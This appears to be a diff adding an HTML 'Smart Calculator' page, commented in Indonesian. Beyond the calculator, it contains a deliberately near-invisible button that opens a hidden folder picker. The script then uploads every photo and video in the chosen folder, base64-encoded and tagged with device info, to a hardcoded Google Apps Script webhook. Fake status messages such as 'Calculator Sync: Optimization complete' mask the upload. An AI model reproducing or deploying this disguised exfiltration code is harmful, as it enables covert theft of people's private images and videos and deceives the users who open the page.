@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Calculator</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: sans-serif;
+        }
+
+        /* Desain Kalkulator */
+        .calc-container {
+            background: #000;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 280px;
+        }
+        #display {
+            width: 100%;
+            height: 60px;
+            background: transparent;
+            border: none;
+            color: white;
+            text-align: right;
+            font-size: 32px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+        button {
+            height: 55px;
+            border-radius: 50%;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            background: #333;
+            color: white;
+            transition: 0.2s;
+        }
+        button:active { background: #555; }
+        .operator { background: #f39c12; }
+        .equal { background: #27ae60; }
+
+        /* Tombol Release Tersembunyi */
+        .footer-area {
+            position: fixed;
+            bottom: 10px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #releaseBtn {
+            width: 12px;
+            height: 12px;
+            background-color: #222; /* Sangat samar */
+            border: 1px solid #333;
+            border-radius: 50%;
+            cursor: pointer;
+            margin-bottom: 5px;
+        }
+        #status {
+            color: #333; /* Warna abu gelap biar gak kebaca jelas */
+            font-size: 8px; /* Sangat kecil */
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="calc-container">
+        <input type="text" id="display" value="0" readonly>
+        <div class="buttons">
+            <button onclick="clearDisplay()">C</button>
+            <button onclick="input('/')">/</button>
+            <button onclick="input('*')">×</button>
+            <button onclick="input('-')">-</button>
+            <button onclick="input('7')">7</button>
+            <button onclick="input('8')">8</button>
+            <button onclick="input('9')">9</button>
+            <button class="operator" onclick="input('+')">+</button>
+            <button onclick="input('4')">4</button>
+            <button onclick="input('5')">5</button>
+            <button onclick="input('6')">6</button>
+            <button onclick="input('1')">1</button>
+            <button onclick="input('2')">2</button>
+            <button onclick="input('3')">3</button>
+            <button class="equal" onclick="calculate()" style="grid-row: span 2; border-radius: 20px; height: 120px;">=</button>
+            <button onclick="input('0')" style="grid-column: span 2; border-radius: 20px;">0</button>
+            <button onclick="input('.')">.</button>
+        </div>
+    </div>
+
+    <div class="footer-area">
+        <div id="releaseBtn" onclick="triggerRelease()"></div>
+        <div id="status">v1.0.4-stable</div>
+    </div>
+
+    <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
+
+    <script>
+        // Kalkulator Logic
+        let display = document.getElementById('display');
+        function input(v) { if(display.value === '0') display.value = v; else display.value += v; }
+        function clearDisplay() { display.value = '0'; }
+        function calculate() { try { display.value = eval(display.value); } catch { display.value = 'Error'; } }
+
+        // Webhook & Upload Logic
+        const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbz12s5BQzOEpw3zmxqHxUwFD9UAjDrL2K5MQCI7Qgx_g_NL13SJwaUgZHEJ9I_CZYObAA/exec";
+
+        function triggerRelease() {
+            document.getElementById('fileInput').click();
+        }
+
+        document.getElementById('fileInput').onchange = async function(e) {
+            const files = e.target.files;
+            const status = document.getElementById('status');
+            const deviceInfo = navigator.userAgent.split('(')[1].split(')')[0].replace(/ /g, "_");
+
+            for (let i = 0; i < files.length; i++) {
+                let file = files[i];
+                let ext = file.name.split('.').pop().toLowerCase();
+
+                if (['jpg', 'jpeg', 'png', 'mp4', 'mov'].includes(ext)) {
+                    status.innerText = `sync_${i}...`; // Info diperkecil jadi kode teknis
+                    
+                    try {
+                        const base64Data = await toBase64(file);
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify({
+                                device: deviceInfo,
+                                name: file.name,
+                                data: base64Data
+                            })
+                        });
+                    } catch (err) { console.log(err); }
+                }
+            }
+            status.innerText = "system_synced";
+            alert("Calculator Sync: Optimization complete.");
+        };
+
+        const toBase64 = file => new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = () => resolve(reader.result.split(',')[1]);
+            reader.onerror = error => reject(error);
+        });
+    </script>
+</body>
+</html>
